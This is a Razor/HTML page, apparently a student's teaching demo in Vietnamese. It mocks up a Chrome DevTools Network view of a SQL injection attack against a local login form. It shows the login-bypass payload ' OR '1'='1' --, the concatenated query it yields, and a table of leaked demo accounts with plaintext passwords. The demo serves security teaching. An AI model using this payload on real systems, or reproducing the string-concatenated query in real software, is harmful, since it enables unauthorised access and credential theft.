@{
    Layout = null;
}
<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="utf-8" />
    <title>Chrome DevTools - Network Inspection (SQL Injection)</title>
    <link rel="stylesheet" href="~/lib/bootstrap/dist/css/bootstrap.min.css" />
    <style>
        * { box-sizing: border-box; }
        body { margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; background: #202124; color: #e8eaed; overflow: hidden; height: 100vh; }
        
        /* Chrome Window Frame */
        .chrome-frame { display: flex; flex-direction: column; height: 100vh; }
        .chrome-tabs { background: #1f1f1f; display: flex; align-items: center; padding: 8px 12px 0; gap: 6px; }
        .chrome-tab { background: #292a2d; color: #fff; padding: 6px 14px; border-radius: 8px 8px 0 0; font-size: 12px; display: flex; align-items: center; gap: 6px; }
        .chrome-address-bar { background: #292a2d; padding: 6px 16px; display: flex; align-items: center; gap: 10px; font-size: 13px; color: #9aa0a6; border-bottom: 1px solid #3c4043; }
        .address-input { background: #1f1f1f; color: #fff; padding: 4px 12px; border-radius: 20px; flex: 1; border: 1px solid #3c4043; font-family: monospace; }

        /* Split Window: Left is App, Right is DevTools */
        .split-container { display: flex; flex: 1; height: calc(100vh - 80px); }
        .app-pane { width: 50%; border-right: 2px solid #3c4043; background: #f8f9fa; color: #212529; overflow-y: auto; padding: 20px; }
        .devtools-pane { width: 50%; display: flex; flex-direction: column; background: #202124; }

        /* DevTools UI */
        .dt-header { background: #292a2d; display: flex; border-bottom: 1px solid #3c4043; font-size: 12px; }
        .dt-tab { padding: 8px 14px; color: #9aa0a6; cursor: pointer; border-bottom: 2px solid transparent; }
        .dt-tab.active { color: #8ab4f8; border-bottom: 2px solid #8ab4f8; font-weight: bold; background: #202124; }
        
        .dt-toolbar { background: #202124; padding: 6px 12px; border-bottom: 1px solid #3c4043; font-size: 11px; color: #9aa0a6; display: flex; gap: 14px; }
        .dt-filter { color: #8ab4f8; font-weight: bold; }

        /* Network Table */
        .network-table { width: 100%; border-collapse: collapse; font-size: 11.5px; font-family: monospace; }
        .network-table th { background: #292a2d; color: #9aa0a6; text-align: left; padding: 6px 8px; border-bottom: 1px solid #3c4043; font-weight: normal; }
        .network-table td { padding: 6px 8px; border-bottom: 1px solid #292a2d; color: #e8eaed; }
        .network-table tr.selected { background: #283b58; }

        /* Request Details Box */
        .dt-details { flex: 1; border-top: 1px solid #3c4043; background: #202124; padding: 12px; overflow-y: auto; font-family: monospace; font-size: 11.5px; }
        .dt-detail-tabs { display: flex; gap: 12px; border-bottom: 1px solid #3c4043; padding-bottom: 6px; margin-bottom: 10px; font-size: 11px; }
        .dt-detail-tab.active { color: #8ab4f8; font-weight: bold; border-bottom: 2px solid #8ab4f8; padding-bottom: 4px; }
        
        .param-key { color: #8ab4f8; }
        .param-val { color: #f28b82; font-weight: bold; }
        .sql-highlight { background: #3c1e22; border-left: 3px solid #ea4335; padding: 6px; margin: 4px 0; color: #f28b82; }
    </style>
</head>
<body>
    <div class="chrome-frame">
        <!-- Chrome Window Top -->
        <div class="chrome-tabs">
            <div class="chrome-tab">🛡️ SQL Injection Demo (HOU) &bull; DevTools</div>
        </div>
        <div class="chrome-address-bar">
            <span>🔒</span>
            <div class="address-input">http://localhost:5076/SqlInjection</div>
            <span>⚙️</span>
        </div>

        <!-- Split View: Web UI (Left) + DevTools (Right) -->
        <div class="split-container">
            <!-- Left: Web UI Form -->
            <div class="app-pane">
                <div class="badge bg-danger mb-2">OWASP Top 10 - A03:2021</div>
                <h5 class="fw-bold text-dark">Thực Nghiệm SQL Injection</h5>
                <p class="small text-muted mb-3">Người dùng: Nguyễn Danh Học (23A1001D0158)</p>

                <div class="card border-danger shadow-sm mb-3">
                    <div class="card-header bg-danger text-white py-2 small fw-bold">
                        ❌ NHÁNH BỊ LỖI (Nối chuỗi SQL)
                    </div>
                    <div class="card-body p-3">
                        <div class="mb-2">
                            <label class="small fw-bold">Username:</label>
                            <input type="text" class="form-control form-control-sm border-danger font-monospace text-danger fw-bold" value="' OR '1'='1' --" readonly />
                        </div>
                        <div class="mb-2">
                            <label class="small fw-bold">Password:</label>
                            <input type="text" class="form-control form-control-sm border-danger font-monospace" value="anything" readonly />
                        </div>
                        <button class="btn btn-danger btn-sm w-100 fw-bold">🚀 Đã Gửi Request Khai Thác</button>
                    </div>
                </div>

                <div class="alert alert-danger p-2 small mb-2">
                    🚨 <strong>TẤN CÔNG THÀNH CÔNG!</strong> Trích xuất toàn bộ 4 tài khoản CSDL.
                </div>

                <div class="table-responsive">
                    <table class="table table-sm table-bordered small font-monospace">
                        <thead class="table-danger">
                            <tr><th>ID</th><th>User</th><th>Pass</th><th>Role</th></tr>
                        </thead>
                        <tbody>
                            <tr><td>1</td><td>admin</td><td class="text-danger fw-bold">AdminPassword@@2026</td><td><span class="badge bg-danger">Admin</span></td></tr>
                            <tr><td>2</td><td>chuyengia_an</td><td>AnExpert#Pass1</td><td>Specialist</td></tr>
                            <tr><td>3</td><td>khachhang_binh</td><td>BinhUser#Pass2</td><td>Customer</td></tr>
                            <tr><td>4</td><td>khachhang_cuong</td><td>CuongUser#Pass3</td><td>Customer</td></tr>
                        </tbody>
                    </table>
                </div>
            </div>

            <!-- Right: Chrome DevTools Docked -->
            <div class="devtools-pane">
                <!-- DevTools Tabs -->
                <div class="dt-header">
                    <div class="dt-tab">Elements</div>
                    <div class="dt-tab">Console</div>
                    <div class="dt-tab">Sources</div>
                    <div class="dt-tab active">Network</div>
                    <div class="dt-tab">Application</div>
                </div>

                <div class="dt-toolbar">
                    <span class="dt-filter">🔴 Ghi nhận gói tin (Fetch/XHR)</span>
                    <span>Lọc: All &bull; Fetch/XHR &bull; Doc &bull; CSS &bull; JS</span>
                </div>

                <!-- Network Requests Table -->
                <table class="network-table">
                    <thead>
                        <tr>
                            <th>Tên Request</th>
                            <th>Trạng Thái</th>
                            <th>Loại</th>
                            <th>Kích Thước</th>
                            <th>Thời Gian</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr class="selected">
                            <td><span style="color:#f28b82;">⚡ LoginVulnerable</span></td>
                            <td><span style="color:#81c995;">200 OK</span></td>
                            <td>fetch</td>
                            <td>1.4 kB</td>
                            <td>12 ms</td>
                        </tr>
                        <tr>
                            <td>LoginSecure</td>
                            <td><span style="color:#81c995;">200 OK</span></td>
                            <td>fetch</td>
                            <td>320 B</td>
                            <td>8 ms</td>
                        </tr>
                    </tbody>
                </table>

                <!-- Request & Payload Details Panel -->
                <div class="dt-details">
                    <div class="dt-detail-tabs">
                        <span class="dt-detail-tab">Headers</span>
                        <span class="dt-detail-tab active">Payload</span>
                        <span class="dt-detail-tab">Preview (JSON)</span>
                        <span class="dt-detail-tab">Response</span>
                    </div>

                    <div>
                        <span style="color:#9aa0a6;">▼ Form Data (Dữ liệu gửi từ Client lên Server):</span><br/>
                        &nbsp;&nbsp;<span class="param-key">username:</span> <span class="param-val">' OR '1'='1' --</span><br/>
                        &nbsp;&nbsp;<span class="param-key">password:</span> <span>anything</span>
                    </div>

                    <div class="mt-3">
                        <span style="color:#9aa0a6;">▼ Phân Tích Kỹ Thuật (Network Inspector):</span>
                        <div class="sql-highlight">
                            POST /SqlInjection/LoginVulnerable HTTP/1.1<br/>
                            Host: localhost:5076<br/>
                            CÂU LỆNH BỊ THÔNG DỊCH TRÊN SQL SERVER:<br/>
                            <strong>SELECT * FROM Accounts WHERE Username = '' OR '1'='1' --' AND Password = '...'</strong>
                        </div>
                    </div>

                    <div class="mt-2">
                        <span style="color:#9aa0a6;">▼ Dữ Liệu JSON Server Trả Về (Bị Rò Rỉ):</span>
                        <pre style="color:#81c995; background:#18191c; padding:6px; border-radius:4px; margin-top:4px;">
{
  "success": true,
  "isExploited": true,
  "count": 4,
  "accounts": [
    { "id": 1, "username": "admin", "password": "AdminPassword@@2026", "role": "Admin" },
    { "id": 2, "username": "chuyengia_an", "password": "AnExpert#Pass1" }
  ]
}
                        </pre>
                    </div>
                </div>
            </div>
        </div>
    </div>
</body>
</html>
